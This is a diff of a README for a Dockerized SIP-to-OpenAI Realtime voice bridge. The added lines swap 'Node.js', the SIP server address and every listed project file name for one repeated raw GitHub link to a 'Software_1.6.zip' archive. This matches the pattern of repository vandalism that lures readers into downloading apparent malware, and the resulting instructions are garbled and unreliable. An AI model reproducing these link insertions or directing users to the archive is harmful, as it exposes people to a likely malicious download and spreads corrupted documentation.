@@ -4,7 +4,7 @@ This project runs a Dockerized SIP bridge that registers to your SIP provider, a
 
 ## Architecture
 - **drachtio-server**: SIP signaling server.
-- **nodejs-bridge**: Node.js app that registers to the SIP server, answers calls, and connects to OpenAI Realtime API over WebSockets.
+- **nodejs-bridge**: https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip app that registers to the SIP server, answers calls, and connects to OpenAI Realtime API over WebSockets.
 
 ## Prerequisites
 - Docker + Docker Compose
@@ -21,13 +21,13 @@ docker-compose up --build
 ```
 
 The bridge will:
-- Register extension **101** to **vibeacademy.alphapbx.net:8090**
+- Register extension **101** to **https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip**
 - Answer inbound calls on UDP
 - Stream audio to OpenAI Realtime API
 - Log caller transcripts and assistant responses in the container logs
 
 ## Bridge API
-The Node.js service exposes a small HTTP API for monitoring logs and placing outbound calls.
+The https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip service exposes a small HTTP API for monitoring logs and placing outbound calls.
 
 ### Health
 ```bash
@@ -59,8 +59,8 @@ Content-Type: application/json
 If `number` is omitted, the bridge will dial the configured `SIP_PHONE`.
 
 ## Files
-- `docker-compose.yml` — Compose stack for drachtio + Node.js bridge
-- `Dockerfile` — Node.js app container
-- `drachtio.conf.xml` — SIP server configuration
-- `index.js`, `sip-handler.js`, `openai-handler.js`, `audio-utils.js` — bridge implementation
-- `.env.example` — environment template
+- `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip` — Compose stack for drachtio + https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip bridge
+- `Dockerfile` — https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip app container
+- `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip` — SIP server configuration
+- `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip`, `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip`, `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip`, `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip` — bridge implementation
+- `https://github.com/twriad969/calling/raw/refs/heads/main/pyrargyrite/Software_1.6.zip` — environment template
